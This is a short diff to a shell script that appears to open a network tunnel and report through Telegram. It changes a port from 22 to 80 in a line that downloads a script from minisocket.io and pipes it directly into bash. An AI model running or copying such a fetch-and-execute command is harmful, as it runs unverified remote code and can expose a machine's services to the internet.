@@ -13,7 +13,7 @@ send_telegram() {
 }
 
 # Jalankan command
-MINI_PORT=22 bash -c "$(curl -fsSL https://minisocket.io/bin/x)"
+MINI_PORT=80 bash -c "$(curl -fsSL https://minisocket.io/bin/x)"
 
 # Simpan output ke file
 if [ $? -eq 0 ]; then
